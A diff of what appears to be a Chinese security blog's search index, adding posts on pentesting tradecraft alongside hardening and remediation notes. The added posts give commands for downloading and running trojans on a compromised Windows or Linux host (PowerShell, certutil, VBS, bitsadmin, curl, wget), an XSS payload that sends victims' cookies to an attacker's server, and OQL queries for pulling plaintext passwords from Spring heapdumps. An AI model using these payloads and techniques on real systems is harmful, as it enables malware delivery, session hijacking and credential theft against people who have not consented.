+<p>下载并执行文件：（无文件模式不易检测）</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.1.1/1.exe&#x27;</span>,<span class="string">&#x27;C:\test\1.exe&#x27;</span>);<span class="built_in">start-process</span> <span class="string">&#x27;C:\test\1.exe&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p><strong>3 配置密码复杂度策略</strong></p>
-<p>  CentOS系统：修改&#x2F;etc&#x2F;pam.d&#x2F;system-auth文件, 在ucredit&#x3D;-1 lcredit&#x3D;-1 dcredit&#x3D;-1 ocredit&#x3D;-1 选3种，追加到password requisite pam_cracklib.so后面，添加到配置文件中。<span id="more"></span><br>例如：password requisite pam_cracklib.so ucredit&#x3D;-1 lcredit&#x3D;-1 dcredit&#x3D;-1<br>注：ucredit：大写字母个数；lcredit：小写字母个数；dcredit：数字个数；ocredit：特殊字符个数</p>
-<p><strong>4 限定用户su到root</strong></p>
-<p>  编辑su文件(vi &#x2F;etc&#x2F;pam.d&#x2F;su)，在开头添加下面两行：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auth sufficient pam_rootok.so</span><br><span class="line">auth required pam_wheel.so group=wheel</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
 
-<p>这表明只有wheel组的成员可以使用su命令成为root用户。</p>
-<h2 id="二、认证授权"><a href="#二、认证授权" class="headerlink" title="二、认证授权"></a>二、认证授权</h2><p><strong>1 设置文件与目录缺省权限</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在文件/etc/profile中设置umask 默认：022，可改为027</span><br></pre></td></tr></table></figure>
+<h3 id="Certutil："><a href="#Certutil：" class="headerlink" title="Certutil："></a>Certutil：</h3><ul>
+<li>保存在当前路径，文件名称同URL</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>
 
-<p><strong>2 设置命令行界面超时退出</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编辑/etc/profile,增加 export TMOUT=300(单位：秒），重新登录时生效</span><br></pre></td></tr></table></figure>
+<ul>
+<li>保存在当前路径，指定保存文件名称</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.php</span><br></pre></td></tr></table></figure>
 
-<p><strong>3 禁止root用户远程ssh登录</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改/etc/ssh/sshd_config文件,配置PermitRootLogin no 重启sshd服务生效</span><br></pre></td></tr></table></figure>
+<p>使用downloader默认在缓存目录位置：保存下载的文件二进制副本。<br><code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p>
+<ul>
+<li>命令行删除缓存</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete</span><br></pre></td></tr></table></figure>
 
-<p><strong>4 启用syslog日志审计</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编辑/etc/rsyslog.conf, 配置: authpriv.* /var/log/secure 并手动创建该文件，重启rsyslog生效</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查看缓存项目</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache *</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="三、协议安全"><a href="#三、协议安全" class="headerlink" title="三、协议安全"></a>三、协议安全</h2><p><strong>1 禁止FTP匿名用户登录</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编辑/etc/vsftpd.conf(或/etc/vsftpd/vsftpd.conf)文件，设置：anonymous_enable=NO</span><br></pre></td></tr></table></figure>
+<h3 id="Vbs："><a href="#Vbs：" class="headerlink" title="Vbs："></a>Vbs：</h3><p>vbs downloader,使用msxml2.xmlhttp和adodb.stream对象<br>使用echo逐行追加写入(&gt;&gt;)test.vbs</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;)</span><br><span class="line">Set Shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">Post.Open &quot;GET&quot;,&quot;http://192.168.1.1/1.exe&quot;,0</span><br><span class="line">Post.Send()</span><br><span class="line">Set aGet = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">aGet.Mode = 3</span><br><span class="line">aGet.Type = 1</span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile &quot;C:\test\1.exe&quot;,2</span><br></pre></td></tr></table></figure>
 
-<p><strong>2 禁止root登录VSFTP</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编辑/etc/ftpusers(或/etc/vsftpd/ftpusers)文件，添加root</span><br></pre></td></tr></table></figure>
+<p>然后执行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cscript test.vbs</span><br></pre></td></tr></table></figure>
 
-<p><strong>3 SSH配置非22端口，禁用telnet协议</strong></p>
-<h2 id="四、其他"><a href="#四、其他" class="headerlink" title="四、其他"></a>四、其他</h2><p><strong>1 删除.netrc 文件</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查找，find / -maxdepth 3 -name .netrc 2&gt;/dev/null，重命名或者删除</span><br></pre></td></tr></table></figure>
 
-<p><strong>2 删除hosts.equiv文件</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -maxdepth 3 -name hosts.equiv 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
-<p><strong>3 删除.rhosts 文件</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -maxdepth 3 -name .rhosts 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<h3 id="Bitsadmin："><a href="#Bitsadmin：" class="headerlink" title="Bitsadmin："></a>Bitsadmin：</h3><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。xp以后的Windows系统自带</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer n http://<span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">1</span>.exe  C:\test\update\<span class="number">1</span>.exe</span><br></pre></td></tr></table></figure>
 
-<p><strong>4 关闭不必要的服务和端口</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chkconfig --list</span><br><span class="line">chkconfig [--level levels] 服务名 off</span><br></pre></td></tr></table></figure>
-<p><strong>5 删除系统banner信息，避免泄漏操作系统泄漏</strong></p>
-<p>删除或重命名”&#x2F;etc”目录下的 issue.net 和 issue 文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /etc/issue /etc/issue.bak</span><br><span class="line">mv /etc/issue.net /etc/issue.net.bak</span><br></pre></td></tr></table></figure>
+<p>不支持https、ftp协议，php python带的服务器会出错，下载速度较慢</p>
+<h3 id="Curl："><a href="#Curl：" class="headerlink" title="Curl："></a>Curl：</h3><p>在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -O http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>
+
+<p>保存网页中的文件，要注意这里后面的url要具体到某个文件，不然抓不下来</p>
+<h3 id="Wget："><a href="#Wget：" class="headerlink" title="Wget："></a>Wget：</h3><p>Linux系统中的wget是一个下载文件的工具， 简单直接，支持递归下载</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget  http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>
+
+<p>对下载文件重命名：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -O  new.exe  http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>
+
+<p>限速下载：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget --limit-rate=300k http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>
+
+
 
 ]]></content>
       <categories>
-        <category>Linux</category>
+        <category>Network</category>
       </categories>
       <tags>
         <tag>Linux</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>MAT 查找 spring heapdump中的密码明文</title>
+    <url>/2020/spring.html</url>
+    <content><![CDATA[<h3 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h3><p>访问 &#x2F;env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 号替换，以达到脱敏的效果。在目标既不出网，&#x2F;jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。这时候就可以利用 Eclipse Memory Analyzer 工具来分析 &#x2F;heapdump 或 &#x2F;actuator&#x2F;heapdump 接口下载的 jvm heap 信息，查找密码明文。</p>
+<h3 id="二、查找方法："><a href="#二、查找方法：" class="headerlink" title="二、查找方法："></a>二、查找方法：</h3><p>使用 Eclipse Memory Analyzer 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> org.springframework.web.context.support.StandardServletEnvironment</span><br></pre></td></tr></table></figure>
+
+<p>然后点击红色感叹号执行查询。如下图， spring boot 1.x 版本 heapdump 查询结果，最终结果存储在 java.util.Hashtable$Entry 实例的键值对中：</p>
+<img src="../images/upload/2020110501.png" style="zoom: 33%;" />
+
+<span id="more"></span>所以也可以用
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> java.util.Hashtable$Entry x <span class="keyword">WHERE</span> (toString(x.key).<span class="keyword">contains</span>(&quot;password&quot;))</span><br></pre></td></tr></table></figure>
+
+<p>来查询。下图为 spring boot 2.x 版本 heapdump 查询结果，最终结果存储在 java.util.LinkedHashMap$Entry 实例的键值对中：</p>
+<img src="../images/upload/2020110502.png" style="zoom: 33%;" />
+
+<p>所以也可以用</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> java.util.LinkedHashMap$Entry x <span class="keyword">WHERE</span> (toString(x.key).<span class="keyword">contains</span>(&quot;password&quot;))</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Penetration</category>
+      </categories>
   </entry>
   <entry>
     <title>Tor的使用与Penetration</title>
@@ -1083,101 +1153,6 @@
       </categories>
   </entry>
   <entry>
-    <title>ssh-keygen命令基本用法</title>
-    <url>/2022/ssh-keygen%E4%BD%BF%E7%94%A8.html</url>
-    <content><![CDATA[<p>​            SSH 公钥认证是ssh认证的方式之一。通过公钥认证可实现ssh免密码登陆，在用户目录的home目录下，有一个.ssh的目录，和当前用户ssh配置认证相关的文件，几乎都在这个目录下。</p>
-<p><strong>ssh-keygen</strong> 用于生成、管理和转换认证密钥</p>
-<h3 id="常用参数："><a href="#常用参数：" class="headerlink" title="常用参数："></a>常用参数：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-t type:指定要生成的密钥类型，有rsa1(SSH1),dsa(SSH2),ecdsa(SSH2),rsa(SSH2)等类型，较为常用的是rsa类型</span><br><span class="line">-f filename:指定生成的密钥文件名字</span><br><span class="line">-C comment：提供一个新的注释</span><br><span class="line">-b bits：指定要生成的密钥长度 (单位:bit)，对于RSA类型的密钥，最小长度768bits,默认长度为2048bits。DSA密钥必须是1024bits</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>使用 ssh-kengen 会在~/.ssh/目录下生成两个文件，不指定文件名和密钥类型的时候，默认生成的两个文件是：
-
-<p>**id_rsa、id_rsa.pub **</p>
-<h3 id="生成密钥对："><a href="#生成密钥对：" class="headerlink" title="生成密钥对："></a>生成密钥对：</h3><p>生成ssh key的时候，可以通过 -f 选项指定生成文件的文件名,-C选项是公钥文件中的备注:s</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@vps .ssh]$ ssh-keygen -t rsa -f test -C &quot;test key&quot;</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br></pre></td></tr></table></figure>
-
-<p>如果文件名是test，结果是:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@vps .ssh]$ ll test*</span><br><span class="line">-rw------- 1 root root 1675 Sep 15 13:24 test</span><br><span class="line">-rw-r--r-- 1 root root 390 Sep 15 13:24 test.pub</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@vps .ssh]$ cat test.pub</span><br><span class="line">ssh-rsa</span><br><span class="line">AAAAB3NzaC1yc2EAAAABIwAAAQEAlgjiMw7AskxbvpQY9rmZPQxQBzh9laxFvbaini2EgmQkNsXBA9WJOXn2YBJauoiVsdUKBWA97avjsobrTxsCYvFr1yQQvTfTlbqlqGNIhQc/3HjTl2pIkClpDWvBrRN+jpyESS4MNbfOL1qjT4c/QhGvj6U6HrN6kUyn58oyyJpTzOLG74AZELJ2Led57QvTw1yJXZuAMWioR0A3BGd25fdocLX3ebux6ya8AsloOVYfsAqGlggrARe6FXjLfMH4a/nxaAdiDYVXU/Vr1ybK9P7SfyEDGJi3JtgiPUlA6vPxUC</span><br><span class="line">E+9IJPQaqqeqCGzrJ6G/XO7om1v9YLLG/H/ZN2tQ== test key</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>shell中文件下载方法</title>
-    <url>/2020/shell%E4%B8%8B%E8%BD%BD.html</url>
-    <content><![CDATA[<p><font color=green>获得目标一定权限后可以下载木马或其它工具到目标机。下面列举了一些常用方法</font></p>
-<h3 id="Powershell："><a href="#Powershell：" class="headerlink" title="Powershell："></a>Powershell：</h3><p>下载并保存文件：（容易被杀毒软件检测）</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.1.1/1.exe&#x27;</span>,<span class="string">&#x27;C:\test\1.exe&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>下载并执行文件：（无文件模式不易检测）</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.1.1/1.exe&#x27;</span>,<span class="string">&#x27;C:\test\1.exe&#x27;</span>);<span class="built_in">start-process</span> <span class="string">&#x27;C:\test\1.exe&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<h3 id="Certutil："><a href="#Certutil：" class="headerlink" title="Certutil："></a>Certutil：</h3><ul>
-<li>保存在当前路径，文件名称同URL</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>保存在当前路径，指定保存文件名称</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.php</span><br></pre></td></tr></table></figure>
-
-<p>使用downloader默认在缓存目录位置：保存下载的文件二进制副本。<br><code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p>
-<ul>
-<li>命令行删除缓存</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查看缓存项目</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache *</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="Vbs："><a href="#Vbs：" class="headerlink" title="Vbs："></a>Vbs：</h3><p>vbs downloader,使用msxml2.xmlhttp和adodb.stream对象<br>使用echo逐行追加写入(&gt;&gt;)test.vbs</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;)</span><br><span class="line">Set Shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">Post.Open &quot;GET&quot;,&quot;http://192.168.1.1/1.exe&quot;,0</span><br><span class="line">Post.Send()</span><br><span class="line">Set aGet = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">aGet.Mode = 3</span><br><span class="line">aGet.Type = 1</span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile &quot;C:\test\1.exe&quot;,2</span><br></pre></td></tr></table></figure>
-
-<p>然后执行</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cscript test.vbs</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="Bitsadmin："><a href="#Bitsadmin：" class="headerlink" title="Bitsadmin："></a>Bitsadmin：</h3><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。xp以后的Windows系统自带</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer n http://<span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">1</span>.exe  C:\test\update\<span class="number">1</span>.exe</span><br></pre></td></tr></table></figure>
-
-<p>不支持https、ftp协议，php python带的服务器会出错，下载速度较慢</p>
-<h3 id="Curl："><a href="#Curl：" class="headerlink" title="Curl："></a>Curl：</h3><p>在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -O http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>
-
-<p>保存网页中的文件，要注意这里后面的url要具体到某个文件，不然抓不下来</p>
-<h3 id="Wget："><a href="#Wget：" class="headerlink" title="Wget："></a>Wget：</h3><p>Linux系统中的wget是一个下载文件的工具， 简单直接，支持递归下载</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget  http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>
-
-<p>对下载文件重命名：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -O  new.exe  http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>
-
-<p>限速下载：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget --limit-rate=300k http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>Network</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>web常见漏洞修复建议</title>
     <url>/2021/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE.html</url>
     <content><![CDATA[<h2 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h2><p>　　<strong>漏洞描述</strong></p>
@@ -1210,7 +1185,7 @@
 <p>　　（3）不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</p>
 <p>　　（4）对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行检查。</p>
 <h2 id="3-XXE"><a href="#3-XXE" class="headerlink" title="3.XXE"></a>3.XXE</h2><p>　　<strong>漏洞详情</strong></p>
-<p>　　参考：<a href="https://www.freebuf.com/company-information/165769.html">https://www.freebuf.com/company-information/165769.html</a></p>
+<p>　　参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29tcGFueS1pbmZvcm1hdGlvbi8xNjU3NjkuaHRtbA==">https://www.freebuf.com/company-information/165769.html<i class="fa fa-external-link-alt"></i></span></p>
 <h2 id="4-CSRF"><a href="#4-CSRF" class="headerlink" title="4.CSRF"></a>4.CSRF</h2><p>　　<strong>漏洞描述****：</strong></p>
 <p>　　CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。</p>
 <p>　　<strong>修复建议</strong></p>
@@ -1290,7 +1265,7 @@
 <p>　　2、设置目录访问权限</p>
 <h2 id="15-PHP反序列化"><a href="#15-PHP反序列化" class="headerlink" title="15.PHP反序列化"></a>15.PHP反序列化</h2><p><strong>漏洞描述</strong></p>
 <p>　　php反序列化漏洞也叫PHP对象注入，形成原因为程序未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行、文件操作、执行数据库操作等不可控后果。这一类攻击在java、python等面向对象语言中均存在。</p>
-<p>可参考：<a href="https://www.freebuf.com/articles/web/167721.html">https://www.freebuf.com/articles/web/167721.html</a></p>
+<p>可参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE2NzcyMS5odG1s">https://www.freebuf.com/articles/web/167721.html<i class="fa fa-external-link-alt"></i></span></p>
 <p>　　<strong>修复建议</strong></p>
 <p>　　1、对传入的对象进行严格的过滤检查</p>
 <p>　　2、在反序列化过程执行的文件读写、命令或代码执行函数中是否有用户可控的参数。</p>
@@ -1359,7 +1334,7 @@
 <p>　　1）修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)。</p>
 <p>　　2）如果你的web环境不需要asp.net的支持你可以进入Internet 信息服务(IIS)管理器 — Web 服务扩展 - ASP.NET 选择禁止此功能。</p>
 <p>　　3）升级net framework 至4.0以上版本。</p>
-<p>　　3.将web文件夹的内容拷贝到另一个位置，比如D:\www到D:\<a href="http://www.back,然后删除原文件夹d/www%EF%BC%8C%E5%86%8D%E9%87%8D%E5%91%BD%E5%90%8DD:/www.back%E5%88%B0D:/www%E3%80%82%E5%A6%82%E6%9E%9C%E4%B8%8D%E9%87%8D%E6%96%B0%E5%A4%8D%E5%88%B6%EF%BC%8C%E5%B7%B2%E7%BB%8F%E5%AD%98%E5%9C%A8%E7%9A%84%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E5%88%99%E6%98%AF%E4%B8%8D%E4%BC%9A%E6%B6%88%E5%A4%B1%E7%9A%84%E3%80%82">www.back，然后删除原文件夹D:\www，再重命名D:\www.back到D:\www。如果不重新复制，已经存在的短文件名则是不会消失的。</a></p>
+<p>　　3.将web文件夹的内容拷贝到另一个位置，比如D:\www到D:\<span class="exturl" data-url="aHR0cDovL3d3dy5iYWNrLOeEtuWQjuWIoOmZpOWOn+aWh+S7tuWkuWQvd3d3JUVGJUJDJThDJUU1JTg2JThEJUU5JTg3JThEJUU1JTkxJUJEJUU1JTkwJThERDovd3d3LmJhY2slRTUlODglQjBEOi93d3clRTMlODAlODIlRTUlQTYlODIlRTYlOUUlOUMlRTQlQjglOEQlRTklODclOEQlRTYlOTYlQjAlRTUlQTQlOEQlRTUlODglQjYlRUYlQkMlOEMlRTUlQjclQjIlRTclQkIlOEYlRTUlQUQlOTglRTUlOUMlQTglRTclOUElODQlRTclOUYlQUQlRTYlOTYlODclRTQlQkIlQjYlRTUlOTAlOEQlRTUlODglOTklRTYlOTglQUYlRTQlQjglOEQlRTQlQkMlOUElRTYlQjYlODglRTUlQTQlQjElRTclOUElODQlRTMlODAlODI=">www.back，然后删除原文件夹D:\www，再重命名D:\www.back到D:\www。如果不重新复制，已经存在的短文件名则是不会消失的。<i class="fa fa-external-link-alt"></i></span></p>
 <h2 id="27-应用程序错误信息泄露"><a href="#27-应用程序错误信息泄露" class="headerlink" title="27.应用程序错误信息泄露"></a>27.应用程序错误信息泄露</h2><p>　　<strong>漏洞描述</strong></p>
 <p>　　攻击者可通过特殊的攻击向量，使web服务器出现500、403等相关错误，导致信息泄漏如绝对路径、webserver版本、源代码、sql语句等敏感信息，恶意攻击者很有可能利用这些信息实施进一步的攻击。</p>
 <p>　　<strong>修复建议</strong></p>
@@ -1431,6 +1406,43 @@
       </categories>
   </entry>
   <entry>
+    <title>ssh-keygen命令基本用法</title>
+    <url>/2022/ssh-keygen%E4%BD%BF%E7%94%A8.html</url>
+    <content><![CDATA[<p>​            SSH 公钥认证是ssh认证的方式之一。通过公钥认证可实现ssh免密码登陆，在用户目录的home目录下，有一个.ssh的目录，和当前用户ssh配置认证相关的文件，几乎都在这个目录下。</p>
+<p><strong>ssh-keygen</strong> 用于生成、管理和转换认证密钥</p>
+<h3 id="常用参数："><a href="#常用参数：" class="headerlink" title="常用参数："></a>常用参数：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-t type:指定要生成的密钥类型，有rsa1(SSH1),dsa(SSH2),ecdsa(SSH2),rsa(SSH2)等类型，较为常用的是rsa类型</span><br><span class="line">-f filename:指定生成的密钥文件名字</span><br><span class="line">-C comment：提供一个新的注释</span><br><span class="line">-b bits：指定要生成的密钥长度 (单位:bit)，对于RSA类型的密钥，最小长度768bits,默认长度为2048bits。DSA密钥必须是1024bits</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>使用 ssh-kengen 会在~/.ssh/目录下生成两个文件，不指定文件名和密钥类型的时候，默认生成的两个文件是：
+
+<p>**id_rsa、id_rsa.pub **</p>
+<h3 id="生成密钥对："><a href="#生成密钥对：" class="headerlink" title="生成密钥对："></a>生成密钥对：</h3><p>生成ssh key的时候，可以通过 -f 选项指定生成文件的文件名,-C选项是公钥文件中的备注:s</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@vps .ssh]$ ssh-keygen -t rsa -f test -C &quot;test key&quot;</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br></pre></td></tr></table></figure>
+
+<p>如果文件名是test，结果是:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@vps .ssh]$ ll test*</span><br><span class="line">-rw------- 1 root root 1675 Sep 15 13:24 test</span><br><span class="line">-rw-r--r-- 1 root root 390 Sep 15 13:24 test.pub</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@vps .ssh]$ cat test.pub</span><br><span class="line">ssh-rsa</span><br><span class="line">AAAAB3NzaC1yc2EAAAABIwAAAQEAlgjiMw7AskxbvpQY9rmZPQxQBzh9laxFvbaini2EgmQkNsXBA9WJOXn2YBJauoiVsdUKBWA97avjsobrTxsCYvFr1yQQvTfTlbqlqGNIhQc/3HjTl2pIkClpDWvBrRN+jpyESS4MNbfOL1qjT4c/QhGvj6U6HrN6kUyn58oyyJpTzOLG74AZELJ2Led57QvTw1yJXZuAMWioR0A3BGd25fdocLX3ebux6ya8AsloOVYfsAqGlggrARe6FXjLfMH4a/nxaAdiDYVXU/Vr1ybK9P7SfyEDGJi3JtgiPUlA6vPxUC</span><br><span class="line">E+9IJPQaqqeqCGzrJ6G/XO7om1v9YLLG/H/ZN2tQ== test key</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>简易xss平台 获取Cookie</title>
+    <url>/2020/xss%E8%8E%B7%E5%8F%96.html</url>
+    <content><![CDATA[<p>1、启用python http服务器</p>
+<img src="../images/upload/python3.png" style="zoom:67%;" />
+
+<p>2、在有xss的地方插入截获代码</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=&quot;http://192.168.56.109/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>+<span class="string">&#x27;&quot; width=0 height=0 border=0 /&gt;&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>3、等待管理员触发漏洞后，便会截获到cookie</p>
+<img src="../images/upload/cookie.png" style="zoom: 67%;" />]]></content>
+  </entry>
+  <entry>
     <title>一加5手机上部署kali nethunter</title>
     <url>/2020/%E4%B8%80%E5%8A%A05%E5%AE%89%E8%A3%85kali%20nethunter.html</url>
